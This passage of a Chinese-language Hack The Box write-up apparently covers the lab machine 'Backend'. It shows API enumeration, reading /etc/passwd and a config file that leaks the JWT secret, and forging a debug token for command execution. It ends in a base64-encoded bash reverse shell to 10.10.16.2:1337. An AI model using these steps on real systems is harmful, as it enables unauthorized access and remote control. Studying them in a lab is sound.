http://10.10.11.161/api/v1/user/03</span><br><span class="line">200      GET        1l        1w      141c http://10.10.11.161/api/v1/user/01       </span><br><span class="line">200      GET        1l        1w      144c http://10.10.11.161/api/v1/user/02      </span><br><span class="line">200      GET        1l        1w      141c http://10.10.11.161/api/v1/user/001     </span><br><span class="line">200      GET        1l        1w      144c http://10.10.11.161/api/v1/user/002</span><br><span class="line">200      GET        1l        1w      141c http://10.10.11.161/api/v1/user/0001</span><br><span class="line">200      GET        1l        1w      139c http://10.10.11.161/api/v1/user/003</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl http://10.10.11.161/api/v1/user/signup -X POST -s | jq .</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;detail&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;loc&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;body&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;field required&quot;</span>,</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;value_error.missing&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;               </span><br></pre></td></tr></table></figure>
+
+<p>必填字段值为空。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl -s -X POST -d <span class="string">&quot;Crazy&quot;</span> http://10.10.11.161/api/v1/user/signup -H <span class="string">&quot;Content-Type: application/json&quot;</span> | jq .</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;detail&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;loc&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;body&quot;</span>,</span><br><span class="line">        0</span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Expecting value: line 1 column 1 (char 0)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;value_error.jsondecode&quot;</span>,</span><br><span class="line">      <span class="string">&quot;ctx&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Expecting value&quot;</span>,</span><br><span class="line">        <span class="string">&quot;doc&quot;</span>: <span class="string">&quot;Crazy&quot;</span>,</span><br><span class="line">        <span class="string">&quot;pos&quot;</span>: 0,</span><br><span class="line">        <span class="string">&quot;lineno&quot;</span>: 1,</span><br><span class="line">        <span class="string">&quot;colno&quot;</span>: 1</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">                                                                                                                                                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl -s -X POST -d <span class="string">&#x27;&#123;&quot;Crazy&quot;:&quot;password&quot;&#125;&#x27;</span> http://10.10.11.161/api/v1/user/signup -H <span class="string">&quot;Content-Type: application/json&quot;</span> | jq .</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;detail&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;loc&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;body&quot;</span>,</span><br><span class="line">        <span class="string">&quot;email&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;field required&quot;</span>,</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;value_error.missing&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;loc&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;body&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;field required&quot;</span>,</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;value_error.missing&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">                                                                                                                                                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl -s -X POST -d <span class="string">&#x27;&#123;&quot;email&quot;:&quot;crazy@inside.htb&quot;,&quot;password&quot;:&quot;PassWord1&quot;&#125;&#x27;</span> http://10.10.11.161/api/v1/user/signup -H <span class="string">&quot;Content-Type: application/json&quot;</span> | jq .</span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回为空了，或许不再是json格式了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl -s -X POST -d <span class="string">&#x27;&#123;&quot;email&quot;:&quot;crazy@inside.htb&quot;,&quot;password&quot;:&quot;PassWord1&quot;&#125;&#x27;</span> http://10.10.11.161/api/v1/user/signup -H <span class="string">&quot;Content-Type: application/json&quot;</span>       </span><br><span class="line">&#123;<span class="string">&quot;detail&quot;</span>:<span class="string">&quot;The user with this username already exists in the system&quot;</span>&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>好像注册成功了，既然有注册应该有登录的吧：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl -s -X POST -d <span class="string">&#x27;&#123;&quot;email&quot;:&quot;crazy@inside.htb&quot;,&quot;password&quot;:&quot;PassWord1&quot;&#125;&#x27;</span> http://10.10.11.161/api/v1/user/login -H <span class="string">&quot;Content-Type: application/json&quot;</span></span><br><span class="line">&#123;<span class="string">&quot;detail&quot;</span>:[&#123;<span class="string">&quot;loc&quot;</span>:[<span class="string">&quot;body&quot;</span>,<span class="string">&quot;username&quot;</span>],<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;field required&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;value_error.missing&quot;</span>&#125;,&#123;<span class="string">&quot;loc&quot;</span>:[<span class="string">&quot;body&quot;</span>,<span class="string">&quot;password&quot;</span>],<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;field required&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;value_error.missing&quot;</span>&#125;]&#125;                                                                                                                                                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ curl -s -X POST -d <span class="string">&#x27;&#123;&quot;username&quot;:&quot;crazy@inside.htb&quot;,&quot;password&quot;:&quot;PassWord1&quot;&#125;&#x27;</span> http://10.10.11.161/api/v1/user/login -H <span class="string">&quot;Content-Type: application/json&quot;</span> |jq .</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;detail&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;loc&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;body&quot;</span>,</span><br><span class="line">        <span class="string">&quot;username&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;field required&quot;</span>,</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;value_error.missing&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;loc&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;body&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;field required&quot;</span>,</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;value_error.missing&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">                                                                                                                                                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ curl -s -X POST -d <span class="string">&#x27;username=crazy@inside.htb&amp;password=PassWord1&#x27;</span> http://10.10.11.161/api/v1/user/login </span><br><span class="line">&#123;<span class="string">&quot;access_token&quot;</span>:<span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA2NjcwLCJpYXQiOjE2NjE2MTU0NzAsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiM2JjM2VkODItODdhNC00NjQ0LWE2ZmUtODAyOTI1MTE4NGRlIn0.xITdqMmDHhMIu5sLjrL3eKJlQYDLDs7rkfbC71MOrgA&quot;</span>,<span class="string">&quot;token_type&quot;</span>:<span class="string">&quot;bearer&quot;</span>&#125; </span><br></pre></td></tr></table></figure>
+
+<p>JWT:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ <span class="built_in">echo</span> <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA2NjcwLCJpYXQiOjE2NjE2MTU0NzAsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiM2JjM2VkODItODdhNC00NjQ0LWE2ZmUtODAyOTI1MTE4NGRlIn0.xITdqMmDHhMIu5sLjrL3eKJlQYDLDs7rkfbC71MOrgA&quot;</span>|<span class="built_in">base64</span> -d</span><br><span class="line">&#123;<span class="string">&quot;alg&quot;</span>:<span class="string">&quot;HS256&quot;</span>,<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>&#125;<span class="built_in">base64</span>: 输入无效</span><br><span class="line">                                                                                                                                                                                                                                                                                 </span><br><span class="line">Crazy:~/HackTheBox$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.161/docs -H <span class="string">&quot;Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA2NjcwLCJpYXQiOjE2NjE2MTU0NzAsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiM2JjM2VkODItODdhNC00NjQ0LWE2ZmUtODAyOTI1MTE4NGRlIn0.xITdqMmDHhMIu5sLjrL3eKJlQYDLDs7rkfbC71MOrgA&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220827200134823.png" srcset="/img/loading.gif" lazyload alt="image-20220827200134823"></p>
+<p>这更新密码好像只需要提交用户的GUID：</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220827200316188.png" srcset="/img/loading.gif" lazyload alt="image-20220827200316188"></p>
+<p>显示了201，似乎成功了？</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220827200420516.png" srcset="/img/loading.gif" lazyload alt="image-20220827200420516"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl -X <span class="string">&#x27;POST&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;http://10.10.11.161/api/v1/admin/file&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;accept: application/json&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA4MzM5LCJpYXQiOjE2NjE2MTcxMzksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.8BMwdnGZComGLOk5rBDGM83lpnOGGFtFAlkTCVkRj-E&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;file&quot;: &quot;/etc/passwd&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nhtb:x:1000:1000:htb:/home/htb:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\n&quot;</span>&#125;       </span><br></pre></td></tr></table></figure>
+
+<p>尝试执行命令会报错：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl -X <span class="string">&#x27;GET&#x27;</span> \ </span><br><span class="line">  <span class="string">&#x27;http://10.10.11.161/api/v1/admin/exec/id&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA4MzM5LCJpYXQiOjE2NjE2MTcxMzksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.8BMwdnGZComGLOk5rBDGM83lpnOGGFtFAlkTCVkRj-E&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;detail&quot;</span>:<span class="string">&quot;Debug key missing from JWT&quot;</span>&#125;    </span><br></pre></td></tr></table></figure>
+
+<p>在配置文件里包含了JWT的秘钥：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl -X <span class="string">&#x27;POST&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;http://10.10.11.161/api/v1/admin/file&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;accept: application/json&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA4MzM5LCJpYXQiOjE2NjE2MTcxMzksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.8BMwdnGZComGLOk5rBDGM83lpnOGGFtFAlkTCVkRj-E&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;file&quot;: &quot;/home/htb/uhc/app/core/config.py&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;from pydantic import AnyHttpUrl, BaseSettings, EmailStr, validator\nfrom typing import List, Optional, Union\n\nfrom enum import Enum\n\n\nclass Settings(BaseSettings):\n    API_V1_STR: str = \&quot;/api/v1\&quot;\n    JWT_SECRET: str = \&quot;SuperSecretSigningKey-HTB\&quot;\n    ALGORITHM: str = \&quot;HS256\&quot;\n\n    # 60 minutes * 24 hours * 8 days = 8 days\n    ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 8\n\n    # BACKEND_CORS_ORIGINS is a JSON-formatted list of origins\n    # e.g: &#x27;[\&quot;http://localhost\&quot;, \&quot;http://localhost:4200\&quot;, \&quot;http://localhost:3000\&quot;, \\\n    # \&quot;http://localhost:8080\&quot;, \&quot;http://local.dockertoolbox.tiangolo.com\&quot;]&#x27;\n    BACKEND_CORS_ORIGINS: List[AnyHttpUrl] = []\n\n    @validator(\&quot;BACKEND_CORS_ORIGINS\&quot;, pre=True)\n    def assemble_cors_origins(cls, v: Union[str, List[str]]) -&gt; Union[List[str], str]:\n        if isinstance(v, str) and not v.startswith(\&quot;[\&quot;):\n            return [i.strip() for i in v.split(\&quot;,\&quot;)]\n        elif isinstance(v, (list, str)):\n            return v\n        raise ValueError(v)\n\n    SQLALCHEMY_DATABASE_URI: Optional[str] = \&quot;sqlite:///uhc.db\&quot;\n    FIRST_SUPERUSER: EmailStr = \&quot;root@ippsec.rocks\&quot;    \n\n    class Config:\n        case_sensitive = True\n \n\nsettings = Settings()\n&quot;</span>&#125;                                                                                                                </span><br></pre></td></tr></table></figure>
+
+<p>解码JWT令牌：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ python</span><br><span class="line">Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; import jwt</span><br><span class="line">&gt;&gt;&gt; token = <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA4MzM5LCJpYXQiOjE2NjE2MTcxMzksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.8BMwdnGZComGLOk5rBDGM83lpnOGGFtFAlkTCVkRj-E&quot;</span>&gt;&gt;&gt; secret = <span class="string">&quot;SuperSecretSigningKey-HTB&quot;</span></span><br><span class="line">&gt;&gt;&gt; decoded = jwt.decode(token, secret, [<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">&gt;&gt;&gt; decoded</span><br><span class="line">&#123;<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;access_token&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>: 1662308339, <span class="string">&#x27;iat&#x27;</span>: 1661617139, <span class="string">&#x27;sub&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;is_superuser&#x27;</span>: True, <span class="string">&#x27;guid&#x27;</span>: <span class="string">&#x27;36c2e94a-4271-4259-93bf-c96ad5948284&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>设置Debug键重新生成令牌：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>decoded[<span class="string">&quot;debug&quot;</span>] = <span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>jwt.encode(decoded, secret, <span class="string">&quot;HS256&quot;</span>)</span><br><span class="line"><span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA4MzM5LCJpYXQiOjE2NjE2MTcxMzksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.UZ5Z0tKEn0__lRkAZS2DqEfYAwJJy4-FA3K0BSze8OA&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl -X <span class="string">&#x27;GET&#x27;</span> http://10.10.11.161/api/v1/admin/exec/id -H <span class="string">&#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA4MzM5LCJpYXQiOjE2NjE2MTcxMzksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.UZ5Z0tKEn0__lRkAZS2DqEfYAwJJy4-FA3K0BSze8OA&#x27;</span> </span><br><span class="line"><span class="string">&quot;uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)&quot;</span>      </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl -X <span class="string">&#x27;GET&#x27;</span> <span class="string">&#x27;http://10.10.11.161/api/v1/admin/exec/echo%20&quot;YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yLzEzMzcgMD4mMSIK&quot;|base64%20-d|bash&#x27;</span> -H <span class="string">&#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMzA4MzM5LCJpYXQiOjE2NjE2MTcxMzksInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.UZ5Z0tKEn0__lRkAZS2DqEfYAwJJy4-FA3K0BSze8OA&#x27;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ nc -lvnp 1337         </span><br><span class="line">listening on [any] 1337 ...</span><br><span class="line">connect to [10.10.16.2] from (UNKNOWN) [10.10.11.161] 42262</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (673): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">htb@Backend:~/uhc$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(htb) gid=1000(htb) <span class="built_in">groups</span>=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)</span><br><span class="line">htb@Backend:~/uhc$       </span><br></pre></td></tr></table></figure>
+
+<p>在用户目录下有一个uhc,里边记录着一些登录记录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">htb@Backend:~/uhc$ <span class="built_in">cat</span> auth.log</span><br><span class="line"><span class="built_in">cat</span> auth.log</span><br><span class="line">08/27/2022, 13:16:45 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 13:20:05 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 13:33:25 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 13:36:45 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 13:41:45 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 13:45:05 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 13:58:25 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 14:06:45 - Login Success <span class="keyword">for</span> admin@htb.local</span><br><span class="line">08/27/2022, 14:08:25 - Login Success <span 